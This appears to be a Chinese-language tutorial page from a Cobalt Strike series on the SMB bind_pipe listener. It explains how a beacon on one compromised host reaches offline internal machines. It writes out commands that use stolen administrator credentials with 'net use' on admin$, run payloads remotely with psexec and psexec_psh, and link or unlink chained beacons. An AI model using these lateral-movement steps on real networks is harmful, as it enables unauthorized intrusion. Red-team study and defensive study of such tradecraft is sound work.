<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
	<head>
		<meta http-equiv="Content-Type" content="text/html; charset=utf-8" /><title>
		</title>
		<style type="text/css">
			.cs868C439D{text-align:left;text-indent:0pt;margin:10pt 0pt 0pt 0pt;page-break-after:avoid;page-break-inside:avoid}
			.csB2D98684{color:#4F81BD;background-color:transparent;font-family:Calibri;font-size:14pt;font-weight:bold;font-style:normal;}
			.cs83F14626{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:14pt;font-weight:bold;font-style:normal;}
			.cs6FD73CFB{text-align:left;text-indent:0pt;margin:5pt 24pt 5pt 24pt}
			.cs9C1B1871{color:#000000;background-color:transparent;font-family:Microsoft YaHei UI;font-size:12pt;font-weight:normal;font-style:normal;}
			.cs8926E06{color:#000000;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:normal;font-style:normal;}
			.cs40DD2BC9{text-align:left;text-indent:0pt;margin:9pt 0pt 9pt 0pt}
			.cs3A447A38{text-align:left;text-indent:0pt;margin:0pt 0pt 10pt 0pt}
			.cs9FB05234{color:#000000;background-color:transparent;font-family:Consolas;font-size:11pt;font-weight:normal;font-style:normal;}
			.cs7FFD2630{color:#000000;background-color:transparent;font-family:Microsoft JhengHei UI;font-size:11pt;font-weight:normal;font-style:normal;}
		</style>
	</head>
	<body>
		<h2 class="cs868C439D">
			<a name="X6b1c2435c763f9667fe637e22cf2deb0c69121b"><span class="csB2D98684">windows/beacon_smb/bind_pipe [ </span><span class="cs83F14626">一个专门为多层内网正向级联而设计的监听器</span><span class="csB2D98684"> ]</span></a></h2>
		<p class="cs6FD73CFB"><span class="cs9C1B1871">先来假设这么一种场景</span><span class="cs8926E06">,</span><span class="cs9C1B1871">你当前已经拿到了目标内网中的一台机器的</span><span class="cs8926E06"> beacon shell,</span><span class="cs9C1B1871">然后又通过其它方式搞到了同内网下的另一台</span><span class="cs8926E06"> windows </span><span class="cs9C1B1871">机器的本地</span><span class="cs8926E06"> administrator </span><span class="cs9C1B1871">密码且这台机器的</span><span class="cs8926E06"> smb[445 </span><span class="cs9C1B1871">端口</span><span class="cs8926E06">]</span><span class="cs9C1B1871">能正常通</span><span class="cs8926E06">,</span><span class="cs9C1B1871">不幸的是</span><span class="cs8926E06">,</span><span class="cs9C1B1871">由于各种各样的原因限制</span><span class="cs8926E06">,</span><span class="cs9C1B1871">那台</span><span class="cs8926E06"> windows </span><span class="cs9C1B1871">机器并不能正常访问外网</span><span class="cs8926E06">,</span><span class="cs9C1B1871">也就是说没法再正常的反弹</span><span class="cs8926E06"> beacon shell </span><span class="cs9C1B1871">了</span><span class="cs8926E06">,</span><span class="cs9C1B1871">那么前面那些反向监听器也就全都用不上了</span><span class="cs8926E06">,</span><span class="cs9C1B1871">而我现在就想通过当前仅有的这个</span><span class="cs8926E06">beacon shell </span><span class="cs9C1B1871">能不能把内网那台不能正常访问外网的机器也一块给带出来呢</span><span class="cs8926E06">? </span><span class="cs9C1B1871">答案是肯定的</span><span class="cs8926E06">,bind_pipe </span><span class="cs9C1B1871">就是专为适应这种实战场景而设计的</span></p><p class="cs6FD73CFB"><span class="cs9C1B1871">首先</span><span class="cs8926E06">,</span><span class="cs9C1B1871">新建一个</span><span class="cs8926E06"> bind_pipe </span><span class="cs9C1B1871">监听器</span><span class="cs8926E06">,</span><span class="cs9C1B1871">端口随意</span><span class="cs8926E06">,</span><span class="cs9C1B1871">其实端口用不用都无所谓</span><span class="cs8926E06">,</span><span class="cs9C1B1871">它是通过管道过去的</span><span class="cs8926E06">,</span><span class="cs9C1B1871">只要对方机器的</span><span class="cs8926E06"> 445 </span><span class="cs9C1B1871">端口保持畅通就行</span><span class="cs8926E06">,ip </span><span class="cs9C1B1871">保持默认即可</span></p><p class="cs40DD2BC9"><span><img src="安全工具/CobaltStrike/Cobalt_Strike_3.x系列教程/Cobalt_Strike_生成监听器/windows_beacon_smb_bind_pipe%20[%20%e4%b8%80%e4%b8%aa%e4%b8%93%e9%97%a8%e4%b8%ba%e5%a4%9a%e5%b1%82%e5%86%85%e7%bd%91%e6%ad%a3%e5%90%91%e7%ba%a7%e8%81%94%e8%80%8c%e8%ae%be%e8%ae%a1%e7%9a%84%e7%9b%91%e5%90%ac%e5%99%a8%20_files/image0.png" width="560" height="228" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span><img src="安全工具/CobaltStrike/Cobalt_Strike_3.x系列教程/Cobalt_Strike_生成监听器/windows_beacon_smb_bind_pipe%20[%20%e4%b8%80%e4%b8%aa%e4%b8%93%e9%97%a8%e4%b8%ba%e5%a4%9a%e5%b1%82%e5%86%85%e7%bd%91%e6%ad%a3%e5%90%91%e7%ba%a7%e8%81%94%e8%80%8c%e8%ae%be%e8%ae%a1%e7%9a%84%e7%9b%91%e5%90%ac%e5%99%a8%20_files/image1.png" width="560" height="69" alt="" style="border-width:0px;" /></span></p><p class="cs6FD73CFB"><span class="cs9C1B1871">接着</span><span class="cs8926E06">,</span><span class="cs9C1B1871">通过</span><span class="cs8926E06"> ipc </span><span class="cs9C1B1871">加上目标系统的本地</span><span class="cs8926E06"> administrator </span><span class="cs9C1B1871">账号密码连到目标机器上</span><span class="cs8926E06">,</span><span class="cs9C1B1871">之后再用</span><span class="cs8926E06"> beacon </span><span class="cs9C1B1871">内置的</span><span class="cs8926E06"> psexec_psh </span><span class="cs9C1B1871">功能远程执行</span><span class="cs8926E06"> powershell,</span><span class="cs9C1B1871">此处唯一需要注意的就是</span><span class="cs8926E06">,</span><span class="cs9C1B1871">最后的那个监听器要选择上面创建的那个</span><span class="cs8926E06">&quot;smb &ndash; bind&quot;, </span><span class="cs9C1B1871">在此之后便可获得一个内网机器的正向</span><span class="cs8926E06"> beacon,</span><span class="cs9C1B1871">这就相当于把内网所有</span><span class="cs8926E06">&quot;</span><span class="cs9C1B1871">脱网</span><span class="cs8926E06">&quot;</span><span class="cs9C1B1871">机器的都挂到了当前这台机器上</span><span class="cs8926E06">,</span><span class="cs9C1B1871">然后一并给带出来</span><span class="cs8926E06">,</span><span class="cs9C1B1871">仔细看下那个链状标记</span><span class="cs8926E06">,</span><span class="cs9C1B1871">意思其实就是级联</span><span class="cs8926E06">,</span><span class="cs9C1B1871">具体如下</span></p><p class="cs3A447A38"><span class="cs9FB05234">beacon&gt; shell net use \\192.168.3.11\admin$ /user:&quot;administrator&quot; &quot;Admin12345&quot;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">beacon&gt; psexec_psh 192.168.3.11 smb - bind </span><span class="cs7FFD2630">直接远程执行</span><span class="cs9FB05234"> powershell payload,</span><span class="cs7FFD2630">此处暂时不懂没关系</span></p><p class="cs40DD2BC9"><span><img src="安全工具/CobaltStrike/Cobalt_Strike_3.x系列教程/Cobalt_Strike_生成监听器/windows_beacon_smb_bind_pipe%20[%20%e4%b8%80%e4%b8%aa%e4%b8%93%e9%97%a8%e4%b8%ba%e5%a4%9a%e5%b1%82%e5%86%85%e7%bd%91%e6%ad%a3%e5%90%91%e7%ba%a7%e8%81%94%e8%80%8c%e8%ae%be%e8%ae%a1%e7%9a%84%e7%9b%91%e5%90%ac%e5%99%a8%20_files/image2.png" width="560" height="352" alt="" style="border-width:0px;" /></span></p><p class="cs6FD73CFB"><span class="cs9C1B1871">点击工具栏中耳机旁边的那个三点的形状</span><span class="cs8926E06">,</span><span class="cs9C1B1871">现在看的就非常清晰了</span><span class="cs8926E06">,</span><span class="cs9C1B1871">根据箭头指向</span><span class="cs8926E06">,</span><span class="cs9C1B1871">层级关系一目了然</span></p><p class="cs40DD2BC9"><span><img src="安全工具/CobaltStrike/Cobalt_Strike_3.x系列教程/Cobalt_Strike_生成监听器/windows_beacon_smb_bind_pipe%20[%20%e4%b8%80%e4%b8%aa%e4%b8%93%e9%97%a8%e4%b8%ba%e5%a4%9a%e5%b1%82%e5%86%85%e7%bd%91%e6%ad%a3%e5%90%91%e7%ba%a7%e8%81%94%e8%80%8c%e8%ae%be%e8%ae%a1%e7%9a%84%e7%9b%91%e5%90%ac%e5%99%a8%20_files/image3.png" width="560" height="495" alt="" style="border-width:0px;" /></span></p><p class="cs6FD73CFB"><span class="cs8926E06">smb bind </span><span class="cs9C1B1871">监听器还有个好处就是</span><span class="cs8926E06">,</span><span class="cs9C1B1871">不用的时候可以先把目标机器断开</span><span class="cs8926E06">,</span><span class="cs9C1B1871">用的时候再连上就行了</span><span class="cs8926E06">,</span><span class="cs9C1B1871">无非就是个</span><span class="cs8926E06"> link,unlink </span><span class="cs9C1B1871">动作</span><span class="cs8926E06">,</span><span class="cs9C1B1871">这样可以尽可能渐少暴露面</span><span class="cs8926E06">,</span><span class="cs9C1B1871">实战中相对灵活些</span><span class="cs8926E06">,</span><span class="cs9C1B1871">另外</span><span class="cs8926E06">,</span><span class="cs9C1B1871">不得不说得是</span><span class="cs8926E06">,</span><span class="cs9C1B1871">所有的</span><span class="cs8926E06"> bind</span><span class="cs9C1B1871">都有个最大的问题就是目标系统各种防火墙的问题</span><span class="cs8926E06">,</span><span class="cs9C1B1871">如果目标系统直接阻断了</span><span class="cs8926E06"> 445 </span><span class="cs9C1B1871">端口通信</span><span class="cs8926E06">,</span><span class="cs9C1B1871">很显然就</span><span class="cs8926E06"> bind </span><span class="cs9C1B1871">不过去了</span><span class="cs8926E06">,</span><span class="cs9C1B1871">当然啦</span><span class="cs8926E06">, payload </span><span class="cs9C1B1871">自身的免杀是另外一个问题</span><span class="cs8926E06">, </span><span class="cs9C1B1871">注</span><span class="cs8926E06">: beacon </span><span class="cs9C1B1871">内置的</span><span class="cs8926E06"> psexec *</span><span class="cs9C1B1871">系列功能实测较适用于</span><span class="cs8926E06"> 2008r2 </span><span class="cs9C1B1871">之下的系统</span><span class="cs8926E06">, 2012r2 </span><span class="cs9C1B1871">之后的系统</span><span class="cs8926E06">,</span><span class="cs9C1B1871">很难</span><span class="cs8926E06"> bind </span><span class="cs9C1B1871">成功</span></p><p class="cs3A447A38"><span class="cs9FB05234">beacon&gt; shell net use \\192.168.3.5\admin$ /user:&quot;administrator&quot; &quot;admin&quot;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">beacon&gt; psexec 192.168.3.5 admin$ smb - bind </span><span class="cs7FFD2630">不同于</span><span class="cs9FB05234"> psexec_psh </span><span class="cs7FFD2630">直接执行</span><span class="cs9FB05234"> powershell payload,psexec </span><span class="cs7FFD2630">是先把</span><span class="cs9FB05234"> exe payload </span><span class="cs7FFD2630">通过管道</span><span class="cs9FB05234"> copy </span><span class="cs7FFD2630">过去再执行</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">beacon&gt; unlink 192.168.3.5</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">beacon&gt; link 192.168.3.5</span></p><p class="cs40DD2BC9"><span class="cs8926E06">image</span></p></body>
</html>
